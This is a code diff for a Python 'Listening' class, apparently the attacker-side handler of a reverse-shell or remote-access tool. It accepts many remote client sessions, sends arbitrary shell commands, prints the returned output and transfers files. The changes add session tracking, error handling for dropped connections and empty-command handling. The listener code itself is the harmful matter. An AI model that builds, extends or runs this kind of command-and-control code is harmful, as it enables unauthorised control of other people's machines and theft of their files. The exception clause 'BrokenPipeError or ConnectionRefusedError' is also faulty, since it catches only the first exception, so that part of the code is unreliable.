@@ -27,16 +27,22 @@ class Listening:
             parent_conn, child_conn = Pipe()  # using different pipe to avoid corruption from process reading
             print(f"[+] connect from {client_address[0]}: {client_address[1]} in session: {i}")
             spath = client_socket.recv(self.BUFFER_SIZE).decode()
-            p = Process(target=self.run, args=(child_conn, client_socket))
-            self.sessions[i] = (parent_conn, child_conn, spath)
+            status = True
+            p = Process(target=self.run, args=(child_conn, client_socket, i))
+            self.sessions[i] = [parent_conn, child_conn, spath, status]
             p.start()
             self.process[i] = p.pid
             i += 1
 
-    def run(self, child_conn, client_socket):
+    def run(self, child_conn, client_socket, i):
         while 1:
             cmd = child_conn.recv()
-            self.send_cmd(cmd, client_socket)
+            try:
+                self.send_cmd(cmd, client_socket)
+            except BrokenPipeError or ConnectionRefusedError:
+                print(f"Session {i} has been closed...")
+                self.sessions.pop(i)
+                break
 
     def stop(self, session):
         os.kill(self.process[session], signal.SIGKILL)
@@ -54,7 +60,7 @@ class Listening:
         if rev == "Path doesn't exist!":
             return rev
         elif rev == "0":
-            return "Broken file!"
+            return "Empty or Broken file!"
         else:
             file_size = int(rev)
         client_socket.send("ok".encode())
@@ -84,7 +90,11 @@ class Listening:
             raise FileNotFoundError
 
     def send_cmd(self, cmd, client_socket):
-        if cmd[:8].lower() == "download":
+        if cmd == '':
+            client_socket.send(' '.encode())
+            results = client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
+            print(results, end='')
+        elif cmd[:8].lower() == "download":
             try:
                 filename, localpath = cmd[9:].split(" ")
                 client_socket.send("download ".encode() + filename.encode())
@@ -112,10 +122,10 @@ class Listening:
             client_socket.send(cmd.encode())
             status = self.download(localpath, client_socket)
             print(status)
-
-        # send the command to the client
-        client_socket.send(cmd.encode())
-        # retrieve command results
-        results = client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
-        # print them
-        print(results, end='> ')
+        else:
+            # send the command to the client
+            client_socket.send(cmd.encode())
+            # retrieve command results
+            results = client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
+            # print them
+            print(results, end='')
